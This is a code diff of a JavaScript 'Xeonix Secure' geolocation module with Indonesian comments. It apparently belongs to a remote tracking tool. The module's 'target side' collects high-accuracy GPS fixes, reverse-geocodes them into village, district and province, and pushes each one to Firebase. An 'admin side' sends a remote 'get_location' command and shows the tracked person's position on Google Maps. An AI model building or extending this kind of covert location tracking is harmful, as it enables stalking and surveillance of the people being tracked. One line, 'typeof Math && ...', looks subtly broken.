@@ -1,9 +1,12 @@
-/**
- * Xeonix Advanced Location & Intelligence Mapping Engine v4.0
- * Mimicking High-End Enterprise Geocoding Standards (Google Maps Class String Matching)
- */
+// ==========================================
+// XEONIX SECURE - ADVANCED GEOLOCATION ENGINE
+// ==========================================
 
-// --- TARGET SIDE LOGIC (index.html) ---
+window.waitingGPS = false;
+window.lastLat = null;
+window.lastLon = null;
+
+// FIX: Fungsi Geolocation Canggih dengan Token Gap Intelligence (TGI)
 window.getLocation = function() {
   return new Promise((resolve) => {
     let bestPos = null;
@@ -24,99 +27,123 @@ window.getLocation = function() {
       let wilayah = { desa: "-", kecamatan: "-", kabupaten: "-", provinsi: "-" };
       let apiSukses = false;
 
-      // MULTI-PASS DEEP ADDRESS ANALYZER ENGINE (Anti-Tertukar & Anti-Zonk)
-      function parseAddressData(addr) {
-        let res = { desa: "-", kecamatan: "-", kabupaten: "-", provinsi: "-" };
-        if (!addr) return res;
-
-        // PASS 1: Explicit Value Keyword Scanning (Prioritas Tertinggi)
-        for (let key in addr) {
-          let val = String(addr[key]).trim();
-          let valLower = val.toLowerCase();
-          
-          if (valLower.includes("provinsi") || valLower.includes("propinsi")) {
-            res.provinsi = val;
-          } else if (valLower.includes("kabupaten") || (valLower.startsWith("kota ") && !valLower.includes("kecamatan"))) {
-            res.kabupaten = val;
-          } else if (valLower.includes("kecamatan") || valLower.includes("distrik")) {
-            res.kecamatan = val;
-          } else if (valLower.includes("kelurahan") || valLower.includes("desa ")) {
-            res.desa = val;
-          }
-        }
-
-        // PASS 2: Structural Key Hierarchy Fallback (Jika Pass 1 masih kosong)
-        if (res.provinsi === "-") res.provinsi = addr.state || addr.province || addr.region || "-";
-        if (res.kabupaten === "-") res.kabupaten = addr.regency || addr.city || addr.municipality || addr.county || "-";
-        if (res.kecamatan === "-") {
-          let rawKec = addr.subdistrict || addr.district || addr.city_district || addr.town || "-";
-          // Proteksi silang: Pastikan data kecamatan bukan duplikasi dari field kabupaten
-          if (rawKec !== res.kabupaten && rawKec !== addr.city && rawKec !== addr.regency) {
-            res.kecamatan = rawKec;
-          }
-        }
-        if (res.desa === "-") res.desa = addr.village || addr.suburb || addr.neighbourhood || addr.hamlet || "-";
-
-        // PASS 3: Advanced Clean-up Regex (Membersihkan title teks bawaan API agar rapi di UI)
-        const cleanRegex = /^(kecamatan|kabupaten|kota|provinsi|propinsi|kelurahan|desa|distrik)\s+/i;
-        for (let key in res) {
-          if (res[key] !== "-") {
-            res[key] = res[key].replace(cleanRegex, "").trim();
-          }
-        }
-
-        // PASS 4: Cross-Validation Guard Rails
-        if (res.kecamatan === res.kabupaten) res.kecamatan = "-";
-        
-        return res;
-      }
-
-      // SOURCE GATEWAY A: Nominatim OpenStreetMap (Dengan Reverse Geocoding Filtered Header)
       try {
         let response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1`, {
-          headers: { 'User-Agent': 'XeonixSecureSystem/4.0 (contact: admin@xeonix.local)' }
+          headers: { 'User-Agent': 'XeonixSecureSystem/3.0 (contact: admin@xeonix.local)' }
         });
-        if (response.ok) {
+        if(response.ok) {
           let data = await response.json();
-          if (data && data.address) {
-            wilayah = parseAddressData(data.address);
-            if (wilayah.kecamatan !== "-" || wilayah.kabupaten !== "-") {
-              apiSukses = true;
+          let addr = data.address || {};
+          let displayName = data.display_name || "";
+          
+          // Memecah seluruh teks alamat menjadi token array (Standar Google Maps API Parsing)
+          let tokens = displayName.split(",").map(t => t.trim());
+
+          // 1. Ekstraksi Dasar Berdasarkan Hierarki Koordinat
+          let desaRaw = addr.village || addr.suburb || addr.neighbourhood || addr.hamlet || addr.quarter || "-";
+          let kabupatenRaw = addr.regency || addr.city || addr.county || addr.municipality || "-";
+          let kecamatanRaw = addr.subdistrict || addr.district || addr.city_district || addr.town || "-";
+          let provinsiRaw = addr.state || addr.province || "-";
+
+          // 2. Kross-Validasi Evaluasi Mandiri Mandatori
+          if (kecamatanRaw === "-" || kecamatanRaw === kabupatenRaw) {
+            for (let key in addr) {
+              if (typeof addr[key] === "string" && (addr[key].toLowerCase().includes("kecamatan") || addr[key].toLowerCase().includes("distrik"))) {
+                kecamatanRaw = addr[key];
+                break;
+              }
             }
           }
-        }
-      } catch (e) { console.log("Primary API Network Fail. Switching to backup..."); }
 
-      // SOURCE GATEWAY B: BigDataCloud Corporate API Client (Backup Engine)
+          // 3. TOKEN GAP INTELLIGENCE (TGI) ENGINE - Solusi Kasus Gegeran/Zonk Kecamatan
+          if (kecamatanRaw === "-") {
+            let desaIdx = -1;
+            let kabIdx = -1;
+
+            for (let i = 0; i < tokens.length; i++) {
+              let tLower = tokens[i].toLowerCase();
+              if (desaRaw !== "-" && (tLower.includes(desaRaw.toLowerCase()) || desaRaw.toLowerCase().includes(tLower))) {
+                if (desaIdx === -1) desaIdx = i;
+              }
+              if (kabupatenRaw !== "-" && (tLower.includes(kabupatenRaw.toLowerCase()) || kabupatenRaw.toLowerCase().includes(tLower))) {
+                if (kabIdx === -1) kabIdx = i;
+              }
+            }
+
+            // Jika Desa dan Kabupaten terdeteksi di rantai alamat, ambil string di tengahnya sebagai Kecamatan
+            if (desaIdx !== -1 && kabIdx !== -1 && kabIdx > desaIdx + 1) {
+              kecamatanRaw = tokens[desaIdx + 1];
+            } else if (kabIdx > 0) {
+              // Jika desa luput dari token, ambil token tepat sebelum Kabupaten
+              let candidate = tokens[kabIdx - 1];
+              if (candidate.toLowerCase() !== desaRaw.toLowerCase() && !candidate.toLowerCase().includes("indonesia")) {
+                kecamatanRaw = candidate;
+              }
+            }
+          }
+
+          // 4. Kross-Validasi Perlindungan Data Kabupaten Kosong
+          if (kabupatenRaw === "-") {
+            for (let key in addr) {
+              if (typeof addr[key] === "string" && (addr[key].toLowerCase().includes("kabupaten") || addr[key].toLowerCase().includes("kota"))) {
+                if (!addr[key].toLowerCase().includes("provinsi")) {
+                  kabupatenRaw = addr[key];
+                  break;
+                }
+              }
+            }
+          }
+
+          // 5. Pembersihan Imbuhan Prefix Administrasi Wilayah Indonesia
+          function clean(str) {
+            if (!str || str === "-") return "-";
+            return str.toString()
+              .replace(/kecamatan\s+/i, "")
+              .replace(/distrik\s+/i, "")
+              .replace(/kabupaten\s+/i, "")
+              .replace(/kota\s+/i, "")
+              .replace(/desa\s+/i, "")
+              .replace(/kelurahan\s+/i, "")
+              .replace(/provinsi\s+/i, "")
+              .trim();
+          }
+
+          wilayah.desa = clean(desaRaw);
+          wilayah.kecamatan = clean(kecamatanRaw);
+          wilayah.kabupaten = clean(kabupatenRaw);
+          wilayah.provinsi = clean(provinsiRaw);
+
+          if (wilayah.kecamatan === wilayah.kabupaten) wilayah.kecamatan = "-";
+
+          apiSukses = true;
+        }
+      } catch (e) { console.log("Nominatim Engine Gagal, beralih ke engine cadangan..."); }
+
+      // Backup Engine Geocoding jika API Utama Terkendala Network
       if (!apiSukses) {
         try {
           let response = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=id`);
-          if (response.ok) {
+          if(response.ok) {
             let data = await response.json();
-            let bdcAddr = {};
-            
-            // Ekstraksi data array informatif ke format object linear
-            if (data.localityInfo && data.localityInfo.informative) {
-              data.localityInfo.informative.forEach(item => {
-                if (item.name) bdcAddr[item.order || Math.random()] = item.name;
-              });
+            wilayah.provinsi = data.principalSubdivision || "-";
+            wilayah.kabupaten = data.city || "-";
+            wilayah.kecamatan = data.locality || "-";
+            if(data.localityInfo && data.localityInfo.informative) {
+              let subLoc = data.localityInfo.informative.find(i => i.order === 4 || i.order === 5);
+              if(subLoc) wilayah.desa = subLoc.name;
             }
-            if (data.principalSubdivision) bdcAddr.state = data.principalSubdivision;
-            if (data.city) bdcAddr.city = data.city;
-            if (data.locality) bdcAddr.locality = data.locality;
-
-            let resBDC = parseAddressData(bdcAddr);
-            if (resBDC.kabupaten !== "-") wilayah.kabupaten = resBDC.kabupaten;
-            if (resBDC.kecamatan !== "-") wilayah.kecamatan = resBDC.kecamatan;
-            if (resBDC.provinsi !== "-") wilayah.provinsi = resBDC.provinsi;
-            if (resBDC.desa !== "-") wilayah.desa = resBDC.desa;
+            
+            if (typeof wilayah.kecamatan === "string") wilayah.kecamatan = wilayah.kecamatan.replace(/kecamatan\s+/i, "").trim();
+            if (typeof Math && wilayah.kabupaten === "string") wilayah.kabupaten = wilayah.kabupaten.replace(/kabupaten\s+/i, "").replace(/kota\s+/i, "").trim();
           }
-        } catch (e) { console.log("All Geocoding Engine API failed to respond."); }
+        } catch (e) { console.log("Seluruh sistem koordinat gagal merespon."); }
       }
 
-      // Pengiriman Data Terintegrasi ke Firebase Realtime Database
-      if (typeof db !== "undefined" && typeof deviceId !== "undefined") {
-        db.ref("devices/" + deviceId + "/gpsHistory").push({
+      // Kirim hasil akhir kalkulasi komprehensif ke Firebase Database
+      let targetDB = window.db || db;
+      let targetID = window.deviceId || deviceId;
+      if (targetDB && targetID) {
+        targetDB.ref("devices/" + targetID + "/gpsHistory").push({
           lat: lat, lon: lon, accuracy: accuracy.toFixed(2),
           desa: wilayah.desa, kecamatan: wilayah.kecamatan, kabupaten: wilayah.kabupaten, provinsi: wilayah.provinsi, time: Date.now()
         });
@@ -124,31 +151,21 @@ window.getLocation = function() {
       resolve();
     }
 
-    // GPS Saturation & Warm-up Sequence
     watchId = navigator.geolocation.watchPosition(
       (pos) => {
-        if (!bestPos || pos.coords.accuracy < bestPos.coords.accuracy) {
-          bestPos = pos;
-        }
-        if (bestPos.coords.accuracy <= 15) {
-          processAndSendLocation(bestPos);
-        }
+        if (!bestPos || pos.coords.accuracy < bestPos.coords.accuracy) bestPos = pos;
+        if (bestPos.coords.accuracy <= 15) processAndSendLocation(bestPos);
       },
       (error) => {
-        console.log("GPS Hardware tracking log:", error.message);
-        if (!bestPos && !isResolved) {
-          isResolved = true;
-          resolve();
-        }
+        console.log("GPS Error:", error.message);
+        if (!bestPos && !isResolved) { isResolved = true; resolve(); }
       },
       { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
     );
 
-    // Hard Timeout Safe Guard
     timeoutId = setTimeout(() => {
-      if (bestPos && !isResolved) {
-        processAndSendLocation(bestPos);
-      } else if (!isResolved) {
+      if (bestPos && !isResolved) { processAndSendLocation(bestPos); } 
+      else if (!isResolved) {
         isResolved = true;
         if (watchId) navigator.geolocation.clearWatch(watchId);
         resolve();
@@ -157,79 +174,83 @@ window.getLocation = function() {
   });
 };
 
-// --- ADMIN SIDE LOGIC (admin.html) ---
+// --- FUNGSI NAVIGASI DAN KONTROL ADMIN (DIPANGGIL OLEH ADMIN.HTML) ---
 window.bukaGoogleMaps = function() {
-  if (typeof lastLat !== "undefined" && typeof lastLon !== "undefined" && lastLat && lastLon) {
-    // FIX: Memperbaiki URL Google Maps asli yang valid dan canggih
-    window.open(`https://www.google.com/maps?q=${lastLat},${lastLon}`, '_blank');
+  if(window.lastLat && window.lastLon) {
+    window.open(`https://www.google.com/maps?q=${window.lastLat},${window.lastLon}`, '_blank');
   }
 };
 
 window.ambilPosisi = function() {
-  if (typeof waitingGPS !== "undefined" && waitingGPS) return;
+  if(window.waitingGPS) return;
   window.waitingGPS = true;
-  
   let statusEl = document.getElementById("gpsStatus");
-  if (statusEl) statusEl.innerHTML = "<div class='loading'>📡 Synchronizing location...</div>";
+  if(statusEl) statusEl.innerHTML = "<div class='loading'>📡 Synchronizing location...</div>";
   
-  if (typeof db !== "undefined" && typeof deviceId !== "undefined") {
-    db.ref("devices/" + deviceId + "/command").set("get_location");
+  let targetDB = window.db || db;
+  let targetID = window.deviceId || deviceId;
+  if(targetDB && targetID) {
+    targetDB.ref("devices/" + targetID + "/command").set("get_location");
   }
   
   setTimeout(() => {
-    if (window.waitingGPS) {
-      if (statusEl) statusEl.innerHTML = "<div class='errorText'>Timeout: Failed to acquire fix</div>";
+    if(window.waitingGPS){
+      if(statusEl) statusEl.innerHTML = "<div class='errorText'>Timeout: Failed to acquire fix</div>";
       window.waitingGPS = false;
     }
   }, 10000);
 };
 
-// Detektor Otomatis Sinkronisasi UI Admin
-function initAdminLocationListener() {
-  if (typeof db !== "undefined" && typeof deviceId !== "undefined" && document.getElementById("gpsData")) {
-    db.ref("devices/" + deviceId + "/gpsHistory").limitToLast(1).on("value", snap => {
-      snap.forEach(child => {
-        let d = child.val();
-        window.waitingGPS = false;
-
-        window.lastLat = d.lat;
-        window.lastLon = d.lon;
-        
-        let btnMaps = document.getElementById("btnOpenMaps");
-        if (btnMaps) {
-          btnMaps.disabled = false;
-          btnMaps.style.background = "var(--primary)";
-          btnMaps.style.color = "white";
-          btnMaps.style.borderColor = "var(--primary)";
-          btnMaps.style.cursor = "pointer";
-          btnMaps.innerHTML = "🗺️ Open in Google Maps";
+// Otomatisasi sinkronisasi UI Admin saat DOM termuat sempurna
+document.addEventListener("DOMContentLoaded", () => {
+  if (document.getElementById("gpsData")) {
+     let checkFirebase = setInterval(() => {
+        let targetDB = window.db || db;
+        let targetID = window.deviceId || deviceId;
+        if (targetDB && targetID) {
+           clearInterval(checkFirebase);
+           setupAdminGPSListener(targetDB, targetID);
         }
-
-        let statusEl = document.getElementById("gpsStatus");
-        if (statusEl) statusEl.innerHTML = "<div class='successText'>Location acquired ✔</div>";
-        
-        let dataEl = document.getElementById("gpsData");
-        if (dataEl) {
-          dataEl.innerHTML = `
-            <table>
-            <tr><th>Latitude</th><td>${d.lat}</td></tr>
-            <tr><th>Longitude</th><td>${d.lon}</td></tr>
-            <tr><th>Accuracy</th><td>± ${d.accuracy} m</td></tr>
-            <tr><th>Desa</th><td>${d.desa}</td></tr>
-            <tr><th>Kecamatan</th><td>${d.kecamatan}</td></tr>
-            <tr><th>Kabupaten</th><td>${d.kabupaten}</td></tr>
-            <tr><th>Provinsi</th><td>${d.provinsi}</td></tr>
-            <tr><th>Timestamp</th><td>${new Date(d.time).toLocaleString()}</td></tr>
-            </table>
-          `;
-        }
-      });
-    });
+     }, 100);
   }
-}
+});
 
-if (document.readyState === "loading") {
-  document.addEventListener("DOMContentLoaded", initAdminLocationListener);
-} else {
-  initAdminLocationListener();
+function setupAdminGPSListener(targetDB, targetID) {
+  targetDB.ref("devices/" + targetID + "/gpsHistory").limitToLast(1).on("value", snap => {
+    snap.forEach(child => {
+      let d = child.val();
+      window.waitingGPS = false;
+      window.lastLat = d.lat;
+      window.lastLon = d.lon;
+      
+      let btnMaps = document.getElementById("btnOpenMaps");
+      if(btnMaps) {
+        btnMaps.disabled = false;
+        btnMaps.style.background = "var(--primary)";
+        btnMaps.style.color = "white";
+        btnMaps.style.borderColor = "var(--primary)";
+        btnMaps.style.cursor = "pointer";
+        btnMaps.innerHTML = "🗺️ Open in Google Maps";
+      }
+
+      let statusEl = document.getElementById("gpsStatus");
+      if(statusEl) statusEl.innerHTML = "<div class='successText'>Location acquired ✔</div>";
+      
+      let dataEl = document.getElementById("gpsData");
+      if(dataEl) {
+        dataEl.innerHTML = `
+          <table>
+          <tr><th>Latitude</th><td>${d.lat}</td></tr>
+          <tr><th>Longitude</th><td>${d.lon}</td></tr>
+          <tr><th>Accuracy</th><td>± ${d.accuracy} m</td></tr>
+          <tr><th>Desa</th><td>${d.desa}</td></tr>
+          <tr><th>Kecamatan</th><td>${d.kecamatan}</td></tr>
+          <tr><th>Kabupaten</th><td>${d.kabupaten}</td></tr>
+          <tr><th>Provinsi</th><td>${d.provinsi}</td></tr>
+          <tr><th>Timestamp</th><td>${new Date(d.time).toLocaleString()}</td></tr>
+          </table>
+        `;
+      }
+    });
+  });
 }
